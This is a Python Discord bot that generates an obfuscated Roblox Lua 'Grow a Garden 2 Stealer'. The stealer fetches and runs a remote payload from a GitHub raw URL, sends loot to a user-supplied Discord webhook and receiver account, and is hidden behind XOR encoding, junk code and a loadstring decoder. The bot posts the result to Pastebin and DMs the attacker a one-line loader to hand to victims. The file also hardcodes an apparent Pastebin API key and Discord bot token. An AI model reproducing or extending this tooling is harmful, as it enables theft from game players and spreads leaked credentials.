import discord
from discord import app_commands
from discord.ext import commands
import aiohttp
import asyncio
import random
import re
from typing import List, Tuple, Dict, Any

# Pastebin API configuration
PASTEBIN_API_KEY = 'yi2P02rDq2H2I64oo0o2uip_gB_jpMd4'
PASTEBIN_API_URL = 'https://pastebin.com/api/api_post.php'

# Bot setup
intents = discord.Intents.default()
intents.message_content = True
client = commands.Bot(command_prefix='!', intents=intents)

# Global counter for unique names
name_counter = 0

def rand(min_val: int, max_val: int) -> int:
    """Generate random integer between min and max inclusive"""
    return random.randint(min_val, max_val)

def unique_name(prefix: str = '') -> str:
    """Generate unique variable name"""
    global name_counter
    name_counter += 1
    letters = 'abcdefghijklmnopqrstuvwxyz'
    name = prefix or ''
    for _ in range(2):
        name += letters[rand(0, len(letters) - 1)]
    return f"{name}{name_counter}_{rand(100, 999)}"

def reset_name_counter() -> None:
    """Reset the name counter"""
    global name_counter
    name_counter = 0

def detect_webhook(code: str) -> List[str]:
    """Detect Discord webhook URLs in code"""
    url_pattern = r'(https?://discord\.com/api/webhooks/\d+/[\w-]+)'
    matches = re.findall(url_pattern, code, re.IGNORECASE)
    return matches or []

def protect_webhooks(code: str) -> Dict[str, Any]:
    """Protect webhook URLs in code"""
    webhook_urls = detect_webhook(code)
    if not webhook_urls:
        return {'code': code, 'protectors': []}
    
    protected_code = code
    protectors = []
    
    for url in webhook_urls:
        # Encode URL to numbers
        encoded = [ord(char) for char in url]
        key = rand(50, 200)
        xor_encoded = []
        for j, value in enumerate(encoded):
            xor_encoded.append(value ^ key ^ (j % 255))
        
        var_name = unique_name('wh')
        
        # Lua protector function
        protector = f"local {var_name}=function() local s{{{','.join(map(str, xor_encoded))}}} local k={key} local r=\"\" for i=1,#s do r=r..string.char(bit32.bxor(s[i],k,(i-1)%255)) end return r end"
        protectors.append(protector)
        
        # Escape special characters for regex replacement
        escaped_url = re.escape(url)
        protected_code = re.sub(escaped_url, f'{var_name}()', protected_code)
    
    return {'code': protected_code, 'protectors': protectors}

def generate_obfuscated_layer() -> str:
    """Generate obfuscation layer"""
    var1 = unique_name('v')
    var2 = unique_name('w')
    var3 = unique_name('x')
    
    templates = [
        lambda: f"local {var1}=task;local {var2}={var1}[\"defer\"];{var2}(function() local {var3}={rand(1,100)} end)",
        lambda: f"local {var1}=spawn or task.spawn;{var1}(function() local {var2}={rand(1,100)} end)",
        lambda: f"local {var1}=delay;{var1}({rand(1,3)},function() local {var2}={rand(1,100)} end)",
        lambda: f"local {var1}=wait;{var1}(function() return {rand(1,100)} end)",
        lambda: f"local {var1}=task;local {var2}={var1}[\"wait\"];{var2}({rand(0,1)})",
        lambda: f"local {var1}=coroutine;local {var2}={var1}[\"wrap\"];{var2}(function() local {var3}={rand(1,100)} end)()",
        lambda: f"local {var1}=table;local {var2}={var1}[\"insert\"];local {var3}={{}};{var2}({var3},{rand(1,5)})",
        lambda: f"local {var1}=math;local {var2}={var1}[\"random\"];{var2}(1,{rand(10,100)})",
        lambda: f"local {var1}=pcall;{var1}(function() local {var2}={rand(1,100)} end)",
        lambda: f"local {var1}=loadstring;{var1}(\"return {rand(1,999)}\")()",
        lambda: f"local {var1}=string;local {var2}={var1}[\"sub\"];{var2}(\"{chr(rand(65,90))}\",1,1)",
        lambda: f"local {var1}=bit32;local {var2}={var1}[\"bxor\"];{var2}({rand(1,255)},{rand(1,255)})",
        lambda: f"local {var1}=getgenv or getfenv;local {var2}={var1}();{var2}.{var3}={rand(1,999)}",
        lambda: f"local {var1}=setfenv or function() end;local {var2}=getfenv();{var1}({rand(1,2)},{var2})",
        lambda: f"local {var1}=function({var2}) return {var2}+{rand(1,10)} end;{var1}({rand(1,50)})",
        lambda: f"local {var1}={rand(0,1)};local {var2}={rand(0,1)};{var1}={var1} and {var2}",
        lambda: f"local {var1}=0;local {var2}=0;repeat {var1}={var1}+1;{var2}={var2}+{var1} until {var1}>={rand(3,8)}",
        lambda: f"local {var1}=\"\";for {var2}=1,{rand(3,6)} do {var1}={var1}..string.char({rand(65,90)}) end",
        lambda: f"local {var1}={{{rand(1,10)},{rand(11,20)},{rand(21,30)}}};table.sort({var1})",
        lambda: f"local {var1}=math.random;{var1}({rand(1,100)})",
    ]
    
    return random.choice(templates)()

def generate_layers(count: int) -> str:
    """Generate multiple obfuscation layers"""
    layers = [generate_obfuscated_layer() for _ in range(count)]
    return ' '.join(layers)

def encode_to_numbers(code: str) -> List[int]:
    """Encode string to numbers with XOR encryption"""
    numbers = [ord(char) for char in code]
    seed = rand(50, 200)
    encoded = [seed]
    for i, num in enumerate(numbers):
        encoded.append(num ^ seed ^ (i % 255))
    return encoded

def junk_line() -> str:
    """Generate junk code line"""
    name = unique_name('x')
    name2 = unique_name('y')
    name3 = unique_name('z')
    
    templates = [
        lambda: f"local {name}={rand(0,99)};{name}={name}+1;{name}={name}*{rand(1,5)}",
        lambda: f"local {name},{name2}={rand(0,1)},{rand(0,1)};if {name}~={name2} then {name}={name2} end",
        lambda: f"local function {name}() return {rand(0,1)} end;local {name2}={name}();{name2}=not {name2}",
        lambda: f"local {name}={{}};{name}[1]={rand(0,1)};{name}[2]={rand(0,1)};{name}[1]={name}[1]+{name}[2]",
        lambda: f"while false do local {name}=1;local {name2}=2;{name}={name}+{name2} end",
        lambda: f"repeat local {name}=1;local {name2}=2;{name}={name}+{name2} until true",
        lambda: f"do local {name}={rand(0,9)};local {name2}={rand(0,9)};{name}={name}+{name2};{name}=nil end",
        lambda: f"local {name}={rand(0,100)};if {name}>50 then {name}=0 else {name}=1 end;{name}={name}*2",
        lambda: f"for {name}=1,{rand(1,5)} do local {name2}={name};for {name3}=1,{rand(1,3)} do {name2}={name2}+1 end end",
        lambda: f"local {name}=function({name2}) return {name2}+{rand(1,10)} end;local {name3}={name}({rand(1,50)})",
        lambda: f"local {name}=0;local {name2}=0;repeat {name}={name}+1;{name2}={name2}+{name} until {name}>={rand(3,8)};{name}=nil",
        lambda: f"local {name}=true;local {name2}=false;{name}={name} and {name2};{name2}={name} or true",
        lambda: f"local {name}=string.char({rand(65,90)})..string.char({rand(97,122)})..string.char({rand(65,90)})",
        lambda: f"local {name}=math.random({rand(1,100)});local {name2}=math.random({rand(1,100)});{name}={name}%{name2}",
        lambda: f"pcall(function() local {name}={rand(1,100)} local {name2}={rand(1,100)} return {name}+{name2} end)",
    ]
    
    return random.choice(templates)()

def generate_junk(count: int) -> str:
    """Generate multiple junk code lines"""
    lines = [junk_line() for _ in range(count)]
    return ' '.join(lines)

def build_decoder(encoded_numbers: List[int]) -> str:
    """Build decoder function for the encoded numbers"""
    decode_func = unique_name('dec')
    i_var = unique_name('i')
    seed_var = unique_name('s')
    x_var = unique_name('xr')
    
    numbers_str = ','.join(map(str, encoded_numbers))
    
    return f"""local function {x_var}(a,b,c) local p=1 local r=0 while a>0 or b>0 or c>0 do local ba=a%2 local bb=b%2 local bc=c%2 if (ba+bb+bc)%2==1 then r=r+p end a=math.floor(a/2) b=math.floor(b/2) c=math.floor(c/2) p=p*2 end return r end local function {decode_func}(t) local {seed_var}=t[1] local out="" for {i_var}=2,#t do out=out..string.char({x_var}(t[{i_var}],{seed_var},({i_var}-2)%255)) end return out end loadstring({decode_func}{{{numbers_str}}})()"""

def generate_script(webhook: str, receiver: str, visual: str) -> str:
    """Generate the base Lua script"""
    return f"""
getgenv().weebhook = "{webhook}"
getgenv().Reciver = "{receiver}"
getgenv().visual = "{visual}"

loadstring(game:HttpGet("https://raw.githubusercontent.com/guillermo69710/Scripts/refs/heads/main/gag2lonchehzontop"))()

"""

def obfuscate_code(code: str) -> str:
    """Obfuscate the Lua code"""
    if not code or not code.strip():
        return None
    
    webhook_data = protect_webhooks(code)
    final_code = webhook_data['code']
    protectors = webhook_data['protectors']
    
    reset_name_counter()
    
    code_parts = []
    
    if protectors:
        code_parts.extend(protectors)
        code_parts.append(generate_junk(rand(5, 10)))
    
    layer_count = rand(60, 100)
    code_parts.append(generate_layers(layer_count))
    code_parts.append(generate_junk(rand(10, 20)))
    
    encoded = encode_to_numbers(final_code)
    decoder = build_decoder(encoded)
    code_parts.append(decoder)
    code_parts.append(generate_junk(rand(10, 20)))
    
    all_code = ' '.join(code_parts)
    all_code = re.sub(r'\s+', ' ', all_code).strip()
    
    ascii_art = """--[=[
██╗      ██████╗ ███╗   ██╗ ██████╗██╗  ██╗███████╗███████╗██╗  ██╗
██║     ██╔═══██╗████╗  ██║██╔════╝██║  ██║██╔════╝╚══███╔╝██║  ██║
██║     ██║   ██║██╔██╗ ██║██║     ███████║█████╗    ███╔╝ ███████║
██║     ██║   ██║██║╚██╗██║██║     ██╔══██║██╔══╝   ███╔╝  ██╔══██║
███████╗╚██████╔╝██║ ╚████║╚██████╗██║  ██║███████╗███████╗██║  ██║
╚══════╝ ╚═════╝ ╚═╝  ╚═══╝ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═╝
]=]"""
    
    return f"{ascii_art}\n{all_code}"

async def create_paste(webhook: str, receiver: str, visual: str) -> Dict[str, str]:
    """Create a paste on Pastebin"""
    script = generate_script(webhook, receiver, visual)
    obfuscated_script = obfuscate_code(script)
    
    if not obfuscated_script:
        raise Exception("Error al ofuscar el script")
    
    async with aiohttp.ClientSession() as session:
        data = aiohttp.FormData()
        data.add_field('api_dev_key', PASTEBIN_API_KEY)
        data.add_field('api_option', 'paste')
        data.add_field('api_paste_code', obfuscated_script)
        data.add_field('api_paste_name', 'GAG2 Script')
        data.add_field('api_paste_format', 'lua')
        data.add_field('api_paste_expire_date', '1M')
        data.add_field('api_paste_private', '0')
        
        async with session.post(PASTEBIN_API_URL, data=data) as response:
            paste_url = await response.text()
            
            if not paste_url.startswith('https://pastebin.com/'):
                raise Exception(f"Pastebin error: {paste_url}")
            
            paste_id = paste_url.split('/')[-1]
            raw_url = f"https://pastebin.com/raw/{paste_id}"
            return {'rawUrl': raw_url, 'viewUrl': paste_url}

@client.event
async def on_ready():
    print(f'Bot conectado como {client.user}')
    try:
        synced = await client.tree.sync()
        print(f'Comandos slash registrados: {len(synced)} comandos')
    except Exception as e:
        print(f'Error al registrar comandos: {e}')

@client.tree.command(name="generate_gag2", description="Genera tu stealer de gag2")
@app_commands.describe(
    webhook="Webhook URL de Discord",
    receiver="Nombre del receiver",
    visual="URL del script visual"
)
async def generate_gag2(interaction: discord.Interaction, webhook: str, receiver: str, visual: str):
    await interaction.response.defer(ephemeral=True)
    
    try:
        result = await create_paste(webhook, receiver, visual)
        raw_url = result['rawUrl']
        loadstring_code = f'loadstring(game:HttpGet("{raw_url}"))()'
        
        embed = discord.Embed(
            title='Grow a garden 2 Stealer',
            description=f'Loadstring para ejecutar:\n```lua\n{loadstring_code}\n```',
            color=0x00FF00
        )
        embed.set_footer(text='Lonchehz on top')
        embed.timestamp = discord.utils.utcnow()
        
        await interaction.user.send(embed=embed)
        await interaction.edit_original_response(content='Generado.')
    except Exception as error:
        print(f'Error: {error}')
        await interaction.edit_original_response(content=f'Error: {str(error)}')

# Run the bot
client.run("MTUxNjE4OTE5OTY0NzExMzIyNw.Gd-mXT.p1VvGD610V37eA87bCjAXHwSekWFzSjqvWe7lU")
